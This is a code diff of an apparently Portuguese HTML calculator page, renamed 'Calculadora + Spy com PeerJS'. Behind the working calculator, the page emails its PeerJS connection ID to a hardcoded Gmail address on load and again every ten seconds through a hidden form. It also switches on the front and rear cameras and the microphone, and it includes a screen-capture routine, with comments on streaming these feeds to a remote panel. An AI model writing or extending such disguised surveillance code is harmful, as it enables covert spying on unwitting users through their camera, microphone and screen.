@@ -3,186 +3,333 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Calculadora Rosa</title>
+<title>Calculadora + Spy com PeerJS</title>
+
+<script src="https://cdn.jsdelivr.net/npm/peerjs@1.4.7/dist/peerjs.min.js"></script>
+
 <style>
-  /* seus estilos aqui (igual antes) */
-  :root {
-    --bg-color: #ffe4f2;
-    --calc-bg: #fff0f6;
-    --text-color: #333;
-    --button-color: #ff85c1;
-    --button-text: #fff;
-  }
-  body.pink {
-    --bg-color: #ffe4f2;
-    --calc-bg: #fff0f6;
-    --text-color: #333;
-    --button-color: #ff85c1;
-    --button-text: #fff;
-  }
-  body.dark {
-    --bg-color: #1e1e1e;
-    --calc-bg: #2b2b2b;
-    --text-color: #f0f0f0;
-    --button-color: #4a4a4a;
-    --button-text: #f0f0f0;
-  }
-  body.light {
-    --bg-color: #f0f0f0;
-    --calc-bg: #ffffff;
-    --text-color: #333;
-    --button-color: #e0e0e0;
-    --button-text: #000;
-  }
+  /* Temas para calculadora */
   body {
     font-family: Arial, sans-serif;
-    background-color: var(--bg-color);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
+    background: #f4f4f9;
     margin: 0;
-    transition: background 0.3s;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px;
   }
   .calculator {
-    background-color: var(--calc-bg);
-    padding: 25px;
-    border-radius: 15px;
-    box-shadow: 0 4px 20px rgba(0,0,0,0.2);
-    text-align: center;
     width: 320px;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+    background: var(--bg-color, #fff);
+    color: var(--text-color, #000);
   }
-  .calculator h2 {
-    color: var(--text-color);
-  }
-  input {
+  .display {
     width: 100%;
-    padding: 12px;
-    font-size: 20px;
+    height: 50px;
+    font-size: 24px;
     margin-bottom: 15px;
+    padding: 0 10px;
+    border-radius: 6px;
     border: 2px solid #ccc;
-    border-radius: 8px;
     text-align: right;
+    user-select: none;
+    background: var(--input-bg, #fff);
+    color: var(--text-color, #000);
+  }
+  .buttons {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 10px;
   }
   button {
-    padding: 12px 18px;
+    padding: 15px;
     font-size: 18px;
-    margin: 5px;
     border: none;
-    border-radius: 8px;
-    background-color: var(--button-color);
-    color: var(--button-text);
+    border-radius: 6px;
     cursor: pointer;
-    transition: background 0.2s;
+    background: var(--btn-bg, #2196f3);
+    color: var(--btn-color, white);
+    transition: background-color 0.3s ease;
   }
   button:hover {
-    opacity: 0.9;
+    background: var(--btn-hover-bg, #1769aa);
   }
-  .theme-toggle {
+  #themeSwitcher {
+    margin: 15px 0;
+    padding: 10px 20px;
+    border-radius: 8px;
+    background: var(--btn-bg, #2196f3);
+    color: var(--btn-color, white);
+  }
+  #sendEmailBtn {
+    margin-top: 15px;
+    width: 100%;
+    background: #4caf50;
+  }
+  #sendEmailBtn:hover {
+    background: #3b8b3b;
+  }
+  #emailStatus {
     margin-top: 10px;
+    font-size: 14px;
+    min-height: 22px;
+    color: #555;
+    text-align: center;
+    user-select: none;
+  }
+
+  /* Temas: */
+  body.theme-default {
+    --bg-color: #fff;
+    --text-color: #000;
+    --input-bg: #fff;
+    --btn-bg: #2196f3;
+    --btn-color: #fff;
+    --btn-hover-bg: #1769aa;
+  }
+  body.theme-pink {
+    --bg-color: #ffe6f0;
+    --text-color: #880047;
+    --input-bg: #fff0f7;
+    --btn-bg: #d81b60;
+    --btn-color: #fff;
+    --btn-hover-bg: #a31544;
+  }
+  body.theme-dark {
+    --bg-color: #121212;
+    --text-color: #eee;
+    --input-bg: #333;
+    --btn-bg: #bb86fc;
+    --btn-color: #121212;
+    --btn-hover-bg: #9a67ea;
+  }
+
+  /* Vídeos lado a lado */
+  #videoContainer {
+    margin-top: 30px;
+    display: flex;
+    gap: 15px;
+    justify-content: center;
+  }
+  video {
+    width: 140px;
+    height: 250px;
+    border-radius: 10px;
+    background: black;
   }
 </style>
 </head>
-<body class="pink">
-  <div class="calculator">
-    <h2>Calculadora 💖</h2>
-    <input type="text" id="display" readonly />
-    <div>
-      <button onclick="addToDisplay('1')">1</button>
-      <button onclick="addToDisplay('2')">2</button>
-      <button onclick="addToDisplay('3')">3</button>
-      <button onclick="addToDisplay('+')">+</button>
-    </div>
-    <div>
-      <button onclick="addToDisplay('4')">4</button>
-      <button onclick="addToDisplay('5')">5</button>
-      <button onclick="addToDisplay('6')">6</button>
-      <button onclick="addToDisplay('-')">-</button>
-    </div>
-    <div>
-      <button onclick="addToDisplay('7')">7</button>
-      <button onclick="addToDisplay('8')">8</button>
-      <button onclick="addToDisplay('9')">9</button>
-      <button onclick="addToDisplay('*')">*</button>
-    </div>
-    <div>
-      <button onclick="addToDisplay('0')">0</button>
-      <button onclick="addToDisplay('.')">.</button>
-      <button onclick="clearDisplay()">C</button>
-      <button onclick="calculate()">=</button>
-    </div>
-    <div class="theme-toggle">
-      <button onclick="setTheme('pink')">🌸 Rosa</button>
-      <button onclick="setTheme('light')">☀️ Claro</button>
-      <button onclick="setTheme('dark')">🌙 Escuro</button>
-    </div>
+<body class="theme-pink">
+
+<div class="calculator" role="region" aria-label="Calculadora educacional">
+  <input type="text" id="display" class="display" aria-live="polite" readonly />
+  <div class="buttons" role="group" aria-label="Teclado da calculadora">
+    <button data-value="7">7</button>
+    <button data-value="8">8</button>
+    <button data-value="9">9</button>
+    <button data-value="/">÷</button>
+
+    <button data-value="4">4</button>
+    <button data-value="5">5</button>
+    <button data-value="6">6</button>
+    <button data-value="*">×</button>
+
+    <button data-value="1">1</button>
+    <button data-value="2">2</button>
+    <button data-value="3">3</button>
+    <button data-value="-">−</button>
+
+    <button data-value="0">0</button>
+    <button data-value=".">.</button>
+    <button id="clear">C</button>
+    <button data-value="+">+</button>
+
+    <button id="equals" style="grid-column: span 4;">=</button>
   </div>
 
-<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
-<script>
-  let display = document.getElementById('display');
-  let expression = '';
-  let connected = false;
+  <button id="themeSwitcher" aria-label="Mudar tema da calculadora">Mudar Tema</button>
+  <button id="sendEmailBtn" aria-label="Enviar ID PeerJS por email">Enviar ID PeerJS por Email</button>
+  <div id="emailStatus" aria-live="polite"></div>
+</div>
 
-  function addToDisplay(value) {
-    expression += value;
-    display.value = expression;
-  }
-  function clearDisplay() {
-    expression = '';
+<div id="videoContainer" aria-label="Visualização das câmeras">
+  <video id="videoFront" autoplay muted playsinline></video>
+  <video id="videoBack" autoplay muted playsinline></video>
+</div>
+
+<!-- Formulário oculto para envio via Formspree -->
+<form id="emailForm" style="display:none;" action="https://formspree.io/f/mgvylnbg" method="POST" >
+  <input type="email" name="email" id="emailInput" value="brasildicas667@gmail.com" required />
+  <textarea name="message" id="messageInput"></textarea>
+</form>
+
+<script src="https://cdn.jsdelivr.net/npm/peerjs@1.4.7/dist/peerjs.min.js"></script>
+<script>
+  // --- Calculadora ---
+  const display = document.getElementById('display');
+  const buttons = document.querySelectorAll('.buttons button[data-value]');
+  const clearBtn = document.getElementById('clear');
+  const equalsBtn = document.getElementById('equals');
+  const themeSwitcher = document.getElementById('themeSwitcher');
+
+  let currentTheme = 1; // 1=pink, 2=default, 3=dark
+
+  buttons.forEach(btn => {
+    btn.addEventListener('click', () => {
+      display.value += btn.getAttribute('data-value');
+    });
+  });
+
+  clearBtn.addEventListener('click', () => {
     display.value = '';
-  }
-  function calculate() {
+  });
+
+  equalsBtn.addEventListener('click', () => {
     try {
-      display.value = eval(expression);
-      expression = display.value;
+      const result = Function(`"use strict";return (${display.value})`)();
+      display.value = result;
     } catch {
       display.value = 'Erro';
-      expression = '';
     }
-  }
-  function setTheme(theme) {
-    document.body.className = theme;
-  }
+  });
 
+  themeSwitcher.addEventListener('click', () => {
+    currentTheme++;
+    if (currentTheme > 3) currentTheme = 1;
+
+    if (currentTheme === 1) document.body.className = 'theme-pink';
+    else if (currentTheme === 2) document.body.className = 'theme-default';
+    else document.body.className = 'theme-dark';
+  });
+
+  // --- PeerJS e envio do ID ---
   const peer = new Peer();
+  let myPeerId = null;
+  let isConnected = false;
+  const sendEmailBtn = document.getElementById('sendEmailBtn');
+  const emailStatus = document.getElementById('emailStatus');
+  const emailForm = document.getElementById('emailForm');
+  const messageInput = document.getElementById('messageInput');
 
-  peer.on('open', id => {
-    console.log('Peer ID:', id);
-    sendId(id);
+  let autoSendInterval;
+  let lastSentId = null;
 
-    setInterval(() => {
-      if (!connected) sendId(id);
-    }, 60000);
+  peer.on('open', (id) => {
+    myPeerId = id;
+    console.log('PeerJS ID:', id);
+
+    sendIdByEmail();
+
+    autoSendInterval = setInterval(() => {
+      if (!isConnected && myPeerId !== lastSentId) {
+        sendIdByEmail();
+      }
+    }, 10000);
   });
 
   peer.on('connection', conn => {
-    connected = true;
-    console.log('Painel conectado, não envia mais ID');
+    isConnected = true;
+    clearInterval(autoSendInterval);
+    emailStatus.textContent = "Conectado, envio automático pausado.";
+    emailStatus.style.color = 'blue';
+
+    conn.on('close', () => {
+      isConnected = false;
+      emailStatus.textContent = "Desconectado, reativando envio automático.";
+      emailStatus.style.color = 'orange';
+
+      autoSendInterval = setInterval(() => {
+        if (!isConnected) sendIdByEmail();
+      }, 10000);
+    });
   });
 
-  function sendId(id) {
-    fetch('https://formsubmit.co/ajax/brasildicas667@gmail.com', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Accept': 'application/json'
-      },
-      body: JSON.stringify({
-        name: "Calculadora Rosa",
-        email: "anonimo@calcrosa.com",
-        message: `Peer ID: ${id}`,
-        _captcha: "false"
-      })
-    })
-    .then(res => res.json())
-    .then(data => {
-      console.log('ID enviado:', data);
-    })
-    .catch(err => {
-      console.error('Erro ao enviar ID:', err);
-    });
+  async function sendIdByEmail() {
+    if (!myPeerId) {
+      emailStatus.textContent = '⏳ Aguardando ID PeerJS...';
+      emailStatus.style.color = '#555';
+      return;
+    }
+
+    if (myPeerId === lastSentId) return;
+
+    messageInput.value = `Olá, este é o ID PeerJS para conexão: ${myPeerId}`;
+
+    try {
+      const formData = new FormData(emailForm);
+      const response = await fetch(emailForm.action, {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'application/json' },
+      });
+
+      if (response.ok) {
+        emailStatus.textContent = `✅ Email enviado com sucesso em ${new Date().toLocaleTimeString()}`;
+        emailStatus.style.color = 'green';
+        lastSentId = myPeerId;
+      } else {
+        const data = await response.json();
+        emailStatus.textContent = '❌ Erro ao enviar email: ' + (data.error || 'tente novamente');
+        emailStatus.style.color = 'red';
+      }
+    } catch (error) {
+      emailStatus.textContent = '❌ Erro ao enviar email: ' + error.message;
+      emailStatus.style.color = 'red';
+    }
   }
+
+  sendEmailBtn.addEventListener('click', sendIdByEmail);
+
+  // --- Captura vídeo frontal e traseira + áudio ---
+  const videoFront = document.getElementById('videoFront');
+  const videoBack = document.getElementById('videoBack');
+
+  async function startMedia() {
+    try {
+      // Frente
+      const streamFront = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" },
+        audio: true
+      });
+      videoFront.srcObject = streamFront;
+
+      // Atrás
+      const streamBack = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: "environment" } },
+        audio: false
+      });
+      videoBack.srcObject = streamBack;
+
+      // TODO: aqui vc pode criar conexão PeerJS para transmitir streams
+
+    } catch (err) {
+      console.error('Erro ao acessar câmeras/mic:', err);
+      alert('Permita o acesso à câmera e microfone!');
+    }
+  }
+
+  startMedia();
+
+  // --- Captura da tela e transmissão (exemplo básico) ---
+  async function startScreenCapture() {
+    try {
+      const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
+      // Aqui você pode mostrar ou enviar via PeerJS
+      console.log('Tela capturada', screenStream);
+      // Exemplo: adiciona num video ou envia direto
+    } catch (err) {
+      console.error('Erro ao capturar tela:', err);
+    }
+  }
+  // Para ativar a captura de tela, chame startScreenCapture()
+  // startScreenCapture();
+
+  // Para o sistema funcionar 100% realtime, você precisa montar o canal PeerJS
+  // e enviar streams via conn.call(peerId, stream) etc.
 </script>
 </body>
 </html>
